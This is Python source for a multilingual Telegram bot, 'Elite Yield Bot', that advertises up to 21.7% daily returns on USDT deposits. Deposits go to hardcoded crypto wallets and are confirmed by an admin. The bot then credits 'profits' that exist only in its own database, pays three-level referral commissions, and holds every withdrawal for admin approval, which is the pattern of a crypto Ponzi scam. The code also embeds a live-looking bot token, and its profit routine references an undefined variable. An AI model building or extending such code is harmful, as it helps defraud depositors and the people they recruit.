import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import threading
import time
import logging
from datetime import datetime

logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'
ADMIN_ID = 7989867522
ADMIN_USERNAME = '@YourAdminUsername'

bot = telebot.TeleBot(BOT_TOKEN)

TRC20_WALLET = "TQzZgrHNtG9i8mGufpvW12sxFuy"
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"

conn = sqlite3.connect('elite_yield.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Level1',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en',
    deposit_amount REAL DEFAULT 0
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    wallet_address TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS support_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    message_text TEXT,
    status TEXT DEFAULT 'new',
    created_at INTEGER
)''')
conn.commit()

languages = {
    'en': {
        'welcome': """🌟 Welcome to Elite Yield Bot! 🚀

Unlock up to 21.7% DAILY returns on your USDT investments! 💰

💎 Levels based on deposit:
• $10-99: 16.6%
• $100-799: 17.9%  
• $800-2399: 19.6%
• $2400-5999: 21.7%

💳 Min deposit: $10 USDT
🌐 Networks: TRC20 or BEP20

Start earning passive income today! 📈""",
        'balance_btn': 'Balance',
        'deposit_btn': 'Deposit',
        'withdraw_btn': 'Withdraw',
        'referral_btn': 'Referral',
        'support_btn': 'Support',
        'admin_btn': 'Admin Panel',
        'support_tickets_btn': 'Support Tickets',
        'balance': """Your Balance: ${balance:.2f} USDT
Total Profit: ${total_profit:.2f} USDT
Level: {level}""",
        'deposit_instructions': """Deposit Instructions:

Send USDT to:
TRC20: `{TRC20_WALLET}`
BEP20: `{BEP20_WALLET}`

Min $10. Confirm after sending.""",
        'enter_amount': 'Enter amount (min $10):',
        'invalid_amount': 'Invalid amount!',
        'confirm_deposit': 'Confirm ${amount}',
        'withdraw_submitted': 'Withdrawal request submitted! Waiting for admin approval...',
        'referral_text': """Your Referral Link:
`{ref_link}`

Referrals: {ref_count}
Earn 10% L1, 8% L2, 3% L3 commissions!""",
        'support': 'Send your message to support:',
        'choose_language': 'Choose your language:',
        'english': 'English',
        'persian': 'Persian',
        'turkish': 'Turkish',
        'arabic': 'Arabic',
        'daily_profit': 'Daily profit added: ${profit:.2f} ({rate}% rate)!\nNew balance: ${new_balance:.2f}'
    },
    'fa': {
        'welcome': """خوش آمدید به Elite Yield Bot! 🚀

بازدهی تا 21.7% روزانه روی سرمایه USDT خود را باز کنید! 💰

سطوح بر اساس واریز:
• 10-99$: 16.6%
• 100-799$: 17.9%  
• 800-2399$: 19.6%
• 2400-5999$: 21.7%

حداقل واریز: 10$ USDT
شبکه‌ها: TRC20 یا BEP20

از امروز درآمد غیرفعال کسب کنید! 📈""",
        'balance_btn': 'موجودی',
        'deposit_btn': 'واریز',
        'withdraw_btn': 'برداشت',
        'referral_btn': 'رفرال',
        'support_btn': 'پشتیبانی',
        'admin_btn': 'پنل ادمین',
        'support_tickets_btn': 'تیکت‌های پشتیبانی',
        'balance': """موجودی شما: ${balance:.2f} USDT
سود کل: ${total_profit:.2f} USDT
سطح: {level}""",
        'deposit_instructions': """دستورالعمل واریز:

USDT را به:
TRC20: `{TRC20_WALLET}`
BEP20: `{BEP20_WALLET}`

حداقل 10$. پس از ارسال تأیید کنید.""",
        'enter_amount': 'مبلغ را وارد کنید (حداقل 10$):',
        'invalid_amount': 'نامعتبر!',
        'confirm_deposit': 'تأیید ${amount}',
        'withdraw_submitted': 'درخواست برداشت ثبت شد! منتظر ادمین.',
        'referral_text': """لینک رفرال شما:
`{ref_link}`

رفرال‌ها: {ref_count}
10% L1, 8% L2, 3% L3 کمیسیون!""",
        'support': 'پیام خود را به پشتیبانی بفرستید:',
        'choose_language': 'زبان انتخاب کنید:',
        'english': 'English',
        'persian': 'فارسی',
        'turkish': 'Türkçe',
        'arabic': 'العربية',
        'daily_profit': 'سود روزانه اضافه شد: ${profit:.2f} ({rate}% نرخ)!\nموجودی جدید: ${new_balance:.2f}'
    },
    'tr': {
        'welcome': """Elite Yield Bot'a Hoş Geldiniz! 🚀

USDT yatırımlarınızda günlük %21.7'ye kadar getiri kilidini açın! 💰

Yatırım bazlı seviyeler:
• $10-99: %16.6
• $100-799: %17.9  
• $800-2399: %19.6
• $2400-5999: %21.7

Min yatırım: $10 USDT
Ağlar: TRC20 veya BEP20

Bugün pasif gelir kazanmaya başlayın! 📈""",
        'balance_btn': 'Bakiye',
        'deposit_btn': 'Yatırım',
        'withdraw_btn': 'Çekim',
        'referral_btn': 'Referans',
        'support_btn': 'Destek',
        'admin_btn': 'Admin Paneli',
        'support_tickets_btn': 'Destek Biletleri',
        'balance': """Bakiyeniz: ${balance:.2f} USDT
Toplam Kar: ${total_profit:.2f} USDT
Seviye: {level}""",
        'deposit_instructions': """Yatırım Talimatları:

USDT'yi gönderin:
TRC20: `{TRC20_WALLET}`
BEP20: `{BEP20_WALLET}`

Min $10. Gönderdikten sonra onaylayın.""",
        'enter_amount': 'Miktarı girin (min $10):',
        'invalid_amount': 'Geçersiz!',
        'confirm_deposit': '${amount} Onayla',
        'withdraw_submitted': 'Çekim isteği gönderildi! Admin bekleniyor...',
        'referral_text': """Referans Linkiniz:
`{ref_link}`

Referanslar: {ref_count}
%10 L1, %8 L2, %3 L3 komisyon!""",
        'support': 'Destek mesajınızı gönderin:',
        'choose_language': 'Dil seçin:',
        'english': 'English',
        'persian': 'فارسی',
        'turkish': 'Türkçe',
        'arabic': 'العربية',
        'daily_profit': 'Günlük kar eklendi: ${profit:.2f} (%{rate} oran)!\nYeni bakiye: ${new_balance:.2f}'
    },
    'ar': {
        'welcome': """مرحبا بك في Elite Yield Bot! 🚀

افتح عوائد يومية تصل إلى 21.7% على استثمارات USDT الخاصة بك! 💰

مستويات بناءً على الإيداع:
• $10-99: 16.6%
• $100-799: 17.9%  
• $800-2399: 19.6%
• $2400-5999: 21.7%

الحد الأدنى للإيداع: $10 USDT
الشبكات: TRC20 أو BEP20

ابدأ في كسب الدخل السلبي اليوم! 📈""",
        'balance_btn': 'الرصيد',
        'deposit_btn': 'إيداع',
        'withdraw_btn': 'سحب',
        'referral_btn': 'إحالة',
        'support_btn': 'دعم',
        'admin_btn': 'لوحة الإدارة',
        'support_tickets_btn': 'تذاكر الدعم',
        'balance': """رصيدك: ${balance:.2f} USDT
الربح الإجمالي: ${total_profit:.2f} USDT
المستوى: {level}""",
        'deposit_instructions': """تعليمات الإيداع:

أرسل USDT إلى:
TRC20: `{TRC20_WALLET}`
BEP20: `{BEP20_WALLET}`

الحد الأدنى $10. اضغط تأكيد بعد الإرسال.""",
        'enter_amount': 'أدخل المبلغ (حد أدنى $10):',
        'invalid_amount': 'غير صالح!',
        'confirm_deposit': 'تأكيد ${amount}',
        'withdraw_submitted': 'تم إرسال طلب السحب! انتظر الإدارة...',
        'referral_text': """رابط الإحالة الخاص بك:
`{ref_link}`

الإحالات: {ref_count}
10% L1, 8% L2, 3% L3 عمولة!""",
        'support': 'أرسل رسالتك إلى الدعم:',
        'choose_language': 'اختر اللغة:',
        'english': 'English',
        'persian': 'فارسی',
        'turkish': 'Türkçe',
        'arabic': 'العربية',
        'daily_profit': 'تم إضافة الربح اليومي: ${profit:.2f} (نسبة {rate}%)!\nالرصيد الجديد: ${new_balance:.2f}'
    }
}

def get_profit_rate(amount):
    if 2400 <= amount <= 5999:
        return 0.217
    if 800 <= amount <= 2399:
        return 0.196
    if 100 <= amount <= 799:
        return 0.179
    if 10 <= amount <= 99:
        return 0.166
    return 0

def main_menu(is_admin=False, lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(l['balance_btn'], l['deposit_btn'])
    markup.add(l['withdraw_btn'], l['referral_btn'])
    markup.add(l['support_btn'])
    if is_admin:
        markup.add(l['admin_btn'])
    return markup

def admin_menu(lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('👥 Users List', '⏳ Pending Requests')
    markup.add('📊 Statistics', l['support_tickets_btn'])
    markup.add('🔙 Back to Main')
    return markup

def language_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton(languages['en']['english'], callback_data='lang_en'))
    markup.add(InlineKeyboardButton(languages['en']['persian'], callback_data='lang_fa'))
    markup.add(InlineKeyboardButton(languages['en']['turkish'], callback_data='lang_tr'))
    markup.add(InlineKeyboardButton(languages['en']['arabic'], callback_data='lang_ar'))
    return markup

def get_user_lang(user_id):
    try:
        cursor.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.commit()
        return result[0] if result else 'en'
    except:
        return 'en'

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"User_{user_id}"
    args = message.text.split()
    
    referrer_id = None
    if len(args) > 1 and args[1].startswith('ref_'):
        try:
            referrer_id = int(args[1].split('_')[1])
            if referrer_id != user_id:
                cursor.execute('UPDATE users SET referrer_id = ? WHERE user_id = ?', (referrer_id, user_id))
                conn.commit()
                bot.send_message(referrer_id, 'New referral joined! You\'ll earn commissions from 3 levels!')
        except Exception as e:
            logging.error(f'Referral error: {e}')
    
    lang = get_user_lang(user_id)
    l = languages[lang]
    
    try:
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        if not cursor.fetchone():
            current_time = int(time.time())
            cursor.execute('INSERT INTO users (user_id, username, created_at, language) VALUES (?, ?, ?, ?)', (user_id, username, current_time, lang))
            conn.commit()
            bot.send_message(message.chat.id, l['choose_language'], reply_markup=language_menu())
            return
    except Exception as e:
        logging.error(f'Start DB error: {e}')
    
    cursor.execute('UPDATE users SET username = ? WHERE user_id = ?', (username, user_id))
    conn.commit()
    
    is_admin = user_id == ADMIN_ID
    
    try:
        with open('welcome_banner.jpg', 'rb') as banner:
            bot.send_photo(message.chat.id, banner, caption=l['welcome'], reply_markup=main_menu(is_admin, lang))
    except FileNotFoundError:
        bot.send_message(message.chat.id, l['welcome'], reply_markup=main_menu(is_admin, lang))

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def set_language(call):
    lang = call.data.split('_')[1]
    cursor.execute('UPDATE users SET language = ? WHERE user_id = ?', (lang, call.from_user.id))
    conn.commit()
    bot.answer_callback_query(call.id, "Language set!")
    start_message(call.message)

@bot.message_handler(func=lambda message: True)
def handle_menu(message):
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    l = languages[lang]
    
    try:
        cursor.execute('SELECT balance, total_profit, level FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        conn.commit()
    except Exception as e:
        logging.error(f'Balance DB error: {e}')
        user_data = None
    
    balance = user_data[0] if user_data else 0
    
    is_admin = user_id == ADMIN_ID
    
    if message.text == l['balance_btn']:
        text = l['balance'].format(balance=balance, total_profit=user_data[1] if user_data else 0, level=user_data[2] if user_data else 'Level1')
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang))
    
    elif message.text == l['deposit_btn']:
        bot.send_message(message.chat.id, l['deposit_instructions'].format(TRC20_WALLET=TRC20_WALLET, BEP20_WALLET=BEP20_WALLET))
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_deposit_amount)
    
    elif message.text == l['withdraw_btn']:
        if balance < 1:
            bot.send_message(message.chat.id, 'Minimum withdrawal $1', reply_markup=main_menu(is_admin, lang))
            return
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_withdraw_request)
    
    elif message.text == l['referral_btn']:
        ref_link = f't.me/eliteyieldbot?start=ref_{user_id}'
        try:
            cursor.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
            ref_count = cursor.fetchone()[0]
            conn.commit()
        except:
            ref_count = 0
        text = l['referral_text'].format(ref_link=ref_link, ref_count=ref_count)
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang), parse_mode='Markdown')
    
    elif message.text == l['support_btn']:
        bot.send_message(message.chat.id, l['support'])
        bot.register_next_step_handler(message, forward_support_to_admin)
    
    if is_admin:
        if message.text == l['admin_btn']:
            bot.send_message(message.chat.id, 'Admin Panel', reply_markup=admin_menu(lang))
        
        if message.text == l['support_tickets_btn']:
            try:
                cursor.execute('SELECT id, user_id, username, message_text, created_at FROM support_messages WHERE status = "new" ORDER BY created_at DESC')
                tickets = cursor.fetchall()
                conn.commit()
                if not tickets:
                    bot.send_message(message.chat.id, 'No new tickets.')
                    return
                for ticket in tickets:
                    markup = InlineKeyboardMarkup()
                    markup.add(InlineKeyboardButton('Reply', callback_data=f'support_reply_{ticket[0]}'), InlineKeyboardButton('Seen', callback_data=f'support_seen_{ticket[0]}'))
                    bot.send_message(message.chat.id, f"Ticket {ticket[0]} from {ticket[2]} (ID: {ticket[1]})\nText: {ticket[3]}\nTime: {datetime.fromtimestamp(ticket[4])}", reply_markup=markup)
            except Exception as e:
                logging.error(f'Support tickets error: {e}')
        
        # دیگر گزینه‌های ادمین با if مشابه

def forward_support_to_admin(message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or 'Unknown'
        text = message.text
        current_time = int(time.time())
        cursor.execute('INSERT INTO support_messages (user_id, username, message_text, created_at) VALUES (?, ?, ?, ?)', (user_id, username, text, current_time))
        conn.commit()
        ticket_id = cursor.lastrowid
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton('Reply', callback_data=f'support_reply_{ticket_id}'), InlineKeyboardButton('Seen', callback_data=f'support_seen_{ticket_id}'))
        bot.send_message(ADMIN_ID, f"New support ticket {ticket_id} from {username} (ID: {user_id})", reply_markup=markup)
        bot.send_message(message.chat.id, 'Message sent to support!')
    except Exception as e:
        logging.error(f'Support forward error: {e}')

@bot.callback_query_handler(func=lambda call: call.data.startswith('support_reply_'))
def support_reply(call):
    ticket_id = call.data.split('_')[2]
    msg = bot.send_message(ADMIN_ID, 'Enter reply:')
    bot.register_next_step_handler(msg, lambda m: send_support_reply(m, ticket_id))

def send_support_reply(message, ticket_id):
    reply_text = message.text
    try:
        cursor.execute('SELECT user_id FROM support_messages WHERE id = ?', (ticket_id,))
        user_id = cursor.fetchone()[0]
        conn.commit()
        bot.send_message(user_id, f"Support reply: {reply_text}")
        cursor.execute('UPDATE support_messages SET status = "replied" WHERE id = ?', (ticket_id,))
        conn.commit()
        bot.send_message(ADMIN_ID, 'Reply sent!')
    except Exception as e:
        logging.error(f'Reply error: {e}')

@bot.callback_query_handler(func=lambda call: call.data.startswith('support_seen_'))
def support_seen(call):
    ticket_id = call.data.split('_')[2]
    try:
        cursor.execute('UPDATE support_messages SET status = "seen" WHERE id = ?', (ticket_id,))
        conn.commit()
        bot.answer_callback_query(call.id, "Marked as seen!")
    except Exception as e:
        logging.error(f'Seen error: {e}')

def process_deposit_amount(message):
    try:
        amount = float(message.text)
        if amount < 10:
            bot.send_message(message.chat.id, 'Min $10!')
            return
        user_id = message.from_user.id
        lang = get_user_lang(user_id)
        l = languages[lang]
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(l['confirm_deposit'].format(amount=amount), callback_data=f'dep_confirm_{user_id}_{amount}'))
        bot.send_message(message.chat.id, f"Confirm ${amount} deposit:", reply_markup=markup)
    except:
        bot.send_message(message.chat.id, 'Invalid number!')

@bot.callback_query_handler(func=lambda call: call.data.startswith('dep_confirm_'))
def dep_confirm(call):
    parts = call.data.split('_')
    user_id = int(parts[2])
    amount = float(parts[3])
    try:
        cursor.execute('SELECT username FROM users WHERE user_id = ?', (user_id,))
        username = cursor.fetchone()[0]
        conn.commit()
    except:
        username = 'Unknown'
    current_time = int(time.time())
    cursor.execute('INSERT INTO pending_deposits (user_id, username, amount, created_at) VALUES (?, ?, ?, ?)',
                  (user_id, username, amount, current_time))
    deposit_id = cursor.lastrowid
    conn.commit()
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('Confirm', callback_data=f'admin_confirm_dep_{deposit_id}'),
              InlineKeyboardButton('Reject', callback_data=f'admin_reject_dep_{deposit_id}'))
    
    admin_msg = f"New Deposit: User {username} (ID: {user_id})\nAmount: ${amount}"
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
    
    bot.answer_callback_query(call.id, "Request sent!")
    bot.edit_message_text("Submitted! Wait for admin.", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_confirm_dep_'))
def admin_confirm_dep(call):
    deposit_id = int(call.data.split('_')[3])
    try:
        cursor.execute('SELECT user_id, amount FROM pending_deposits WHERE id = ?', (deposit_id,))
        dep_data = cursor.fetchone()
        conn.commit()
        if dep_data:
            user_id, amount = dep_data
            cursor.execute('UPDATE users SET balance = balance + ?, deposit_amount = ? WHERE user_id = ?', (amount, amount, user_id))
            new_balance = cursor.execute('SELECT balance FROM users WHERE user_id = ?', (user_id,)).fetchone()[0]
            conn.commit()
            rate = get_profit_rate(amount)
            cursor.execute('UPDATE users SET level = ? WHERE user_id = ?', (f'Level for ${amount}', user_id))
            conn.commit()
            
            referrer_id = cursor.execute('SELECT referrer_id FROM users WHERE user_id = ?', (user_id,)).fetchone()[0]
            calculate_referral_commission(amount, referrer_id)
            
            cursor.execute('UPDATE pending_deposits SET status = "confirmed" WHERE id = ?', (deposit_id,))
            conn.commit()
            
            bot.send_message(user_id, f'Deposit ${amount} confirmed! New balance: ${new_balance:.2f}')
            logging.info(f'Deposit ${amount} confirmed for {user_id}')
    except Exception as e:
        logging.error(f'Deposit confirm error: {e}')
    bot.answer_callback_query(call.id, "Confirmed!")

def calculate_referral_commission(deposit_amount, referrer_id):
    if not referrer_id:
        return
    level1_rate = 0.10
    level2_rate = 0.08
    level3_rate = 0.03
    
    commission1 = deposit_amount * level1_rate
    cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (commission1, referrer_id))
    conn.commit()
    bot.send_message(referrer_id, f'Level 1 commission: ${commission1:.2f}')
    
    cursor.execute('SELECT referrer_id FROM users WHERE user_id = ?', (referrer_id,))
    level2 = cursor.fetchone()
    if level2 and level2[0]:
        commission2 = deposit_amount * level2_rate
        cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (commission2, level2[0]))
        conn.commit()
        bot.send_message(level2[0], f'Level 2 commission: ${commission2:.2f}')
        
        cursor.execute('SELECT referrer_id FROM users WHERE user_id = ?', (level2[0],))
        level3 = cursor.fetchone()
        if level3 and level3[0]:
            commission3 = deposit_amount * level3_rate
            cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (commission3, level3[0]))
            conn.commit()
            bot.send_message(level3[0], f'Level 3 commission: ${commission3:.2f}')

def process_withdraw_request(message):
    try:
        amount = float(message.text)
        user_id = message.from_user.id
        cursor.execute('SELECT balance, username FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        conn.commit()
        
        if not user_data or amount > user_data[0] or amount < 1:
            bot.send_message(message.chat.id, 'Invalid amount or insufficient balance! Min $1', reply_markup=main_menu(user_id == ADMIN_ID))
            return
        
        username = user_data[1]
        wallet_msg = bot.send_message(message.chat.id, 'Enter your wallet address (TRC20/BEP20):')
        bot.register_next_step_handler(wallet_msg, lambda msg: process_withdraw_wallet(msg, amount, username))
    except:
        bot.send_message(message.chat.id, 'Enter valid number!', reply_markup=main_menu(user_id == ADMIN_ID))

def process_withdraw_wallet(message, amount, username):
    wallet_address = message.text
    user_id = message.from_user.id
    
    current_time = int(time.time())
    cursor.execute('INSERT INTO pending_withdraws (user_id, username, amount, wallet_address, created_at) VALUES (?, ?, ?, ?, ?)',
                  (user_id, username, amount, wallet_address, current_time))
    conn.commit()
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('Confirm', callback_data=f'admin_confirm_wd_{cursor.lastrowid}'),
              InlineKeyboardButton('Reject', callback_data=f'admin_reject_wd_{cursor.lastrowid}'))
    
    admin_msg = f"New Withdrawal: User {username} (ID: {user_id})\nAmount: ${amount}\nWallet: {wallet_address}"
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
    
    bot.send_message(message.chat.id, languages[get_user_lang(user_id)]['withdraw_submitted'])

def add_daily_profit():
    while True:
        try:
            cursor.execute('SELECT user_id, deposit_amount, last_profit_time, language FROM users WHERE deposit_amount > 0')
            users = cursor.fetchall()
            conn.commit()
            current_time = int(time.time())
            for user in users:
                user_id, deposit_amount, last_time, lang = user
                if current_time - last_time >= 86400:
                    rate = get_profit_rate(deposit_amount)
                    profit = deposit_amount * rate
                    cursor.execute('UPDATE users SET balance = balance + ?, total_profit = total_profit + ?, last_profit_time = ? WHERE user_id = ?',
                                   (profit, profit, current_time, user_id))
                    conn.commit()
                    bot.send_message(user_id, languages[lang]['daily_profit'].format(profit=profit, rate=rate*100, new_balance=balance + profit))
        except Exception as e:
            logging.error(f'Profit error: {e}')
        time.sleep(3600)

if __name__ == '__main__':
    threading.Thread(target=add_daily_profit, daemon=True).start()
    print("Elite Yield Bot starting...")
    bot.polling(none_stop=True)
